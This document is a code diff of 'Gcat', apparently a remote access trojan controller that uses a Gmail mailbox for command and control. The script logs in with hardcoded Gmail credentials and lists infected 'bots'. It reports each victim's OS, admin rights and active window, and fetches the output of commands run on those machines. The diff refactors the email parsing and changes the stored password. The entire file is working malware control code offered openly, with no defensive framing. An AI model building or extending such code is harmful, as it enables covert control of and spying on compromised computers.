@@ -16,13 +16,32 @@ from email import Encoders
 
 #######################################
 gmail_user = 'gcat.test.mofo@gmail.com'
-gmail_pwd = 'gcatmofo123'
+gmail_pwd = 'prettyflypassword'
 server = "smtp.gmail.com"
 server_port = 587
 #######################################
 
 def genJobID(slen=7):
     return ''.join(random.sample(string.ascii_letters + string.digits, slen))
+
+class msgparser:
+
+    def __init__(self, msg_data):
+        self.getText(msg_data)
+        self.getSubjectHeader(msg_data)
+        self.getDateHeader(msg_data)
+
+    def getText(self, msg_data):
+        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
+            if payload.get_content_maintype() == 'text':
+                self.text = payload.get_payload()
+                self.dict = ast.literal_eval(payload.get_payload())
+
+    def getSubjectHeader(self, msg_data):
+        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
+
+    def getDateHeader(self, msg_data):
+        self.date = email.message_from_string(msg_data[1][0][1])['Date']
 
 class Gcat:
 
@@ -55,73 +74,54 @@ class Gcat:
 
 
     def checkBots(self):
-        self.c.select(readonly=1)
         bots = []
-
+        self.c.select(readonly=1)
         rcode, idlist = self.c.uid('search', None, "(UNSEEN)")
+
         for idn in idlist[0].split():
-            msg = email.message_from_string(self.c.uid('fetch', idn, '(RFC822)')[1][0][1])
+            msg_data = self.c.uid('fetch', idn, '(RFC822)')
+            msg = msgparser(msg_data)
+            
             try:
-                botid = str(uuid.UUID(msg["Subject"]))
+                botid = str(uuid.UUID(msg.subject))
                 if botid not in bots:
                     bots.append(botid)
-                    maintype = msg.get_content_maintype()
-
-                    if maintype == 'multipart':
-                        for part in msg.get_payload():
-                            if part.get_content_maintype() == 'text':
-                                msgtext = ast.literal_eval(part.get_payload().rstrip("\r\n"))
                     
-                    elif maintype == 'text':
-                        msgtext = ast.literal_eval(msg.get_payload().rstrip("\r\n"))
-
-                    print botid, msgtext['SYS']
+                    print botid, msg.dict['SYS']
+            
             except ValueError:
                 pass
 
     def getBotInfo(self, botid):
+
         self.c.select(readonly=1)
         rcode, idlist = self.c.uid('search', None, "(SUBJECT '{}')".format(botid))
+
         for idn in idlist[0].split():
-            msg = email.message_from_string(self.c.uid('fetch', idn, '(RFC822)')[1][0][1])
-
-            maintype = msg.get_content_maintype()
-
-            if maintype == 'multipart':
-                for part in msg.get_payload():
-                    if part.get_content_maintype() == 'text':
-                        msgtext = ast.literal_eval(part.get_payload().rstrip("\r\n"))
+            msg_data = self.c.uid('fetch', idn, '(RFC822)')
+            msg = msgparser(msg_data)
             
-            elif maintype == 'text':
-                msgtext = ast.literal_eval(msg.get_payload().rstrip("\r\n"))
-
-            print "ID: " + botid 
-            print "OS: " + msgtext['SYS']
-            print "ADMIN: " + str(msgtext['ADMIN']) 
-            print "FG WINDOW: '{}'".format(msgtext['FGWINDOW'])
+            print "ID: " + botid
+            print "DATE: '{}'".format(msg.date)
+            print "OS: " + msg.dict['SYS']
+            print "ADMIN: " + str(msg.dict['ADMIN']) 
+            print "FG WINDOW: '{}'".format(msg.dict['FGWINDOW'])
             
             return
 
     def getJobResults(self, botid, jobid):
         self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(SUBJECT '{}:{}')".format(botid, jobid))
+        rcode, idlist = self.c.uid('search', None, "(UNSEEN SUBJECT '{}:{}')".format(botid, jobid))
+
         for idn in idlist[0].split():
-            msg = email.message_from_string(self.c.uid('fetch', idn, '(RFC822)')[1][0][1])
+            msg_data = self.c.uid('fetch', idn, '(RFC822)')
+            msg = msgparser(msg_data)
 
-            maintype = msg.get_content_maintype()
-
-            if maintype == 'multipart':
-                for part in msg.get_payload():
-                    if part.get_content_maintype() == 'text':
-                        msgtext = ast.literal_eval(part.get_payload().rstrip("\r\n"))
-
-            elif maintype == 'text':
-                msgtext = ast.literal_eval(msg.get_payload().rstrip("\r\n"))
-
+            print "DATE: '{}'".format(msg.date)
             print "JOBID: " + jobid
-            print "CMD: " + msgtext['MSG']['CMD']
+            print "CMD: '{}'".format(msg.dict['MSG']['CMD'])
             print ''
-            print msgtext['MSG']['RES']
+            print msg.dict['MSG']['RES']
 
             return
 
@@ -130,7 +130,7 @@ class Gcat:
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description="Gcat", version='0.0.1')
+    parser = argparse.ArgumentParser(description="Gcat-NG", version='0.0.1')
     parser.add_argument("-l", dest="list", action="store_true", help="List available clients")
     parser.add_argument("--id", dest='id', default='ALL', type=str, help="Client to target")
     parser.add_argument('--job-id', dest='jobid', type=str, help='Job id to retrieve')
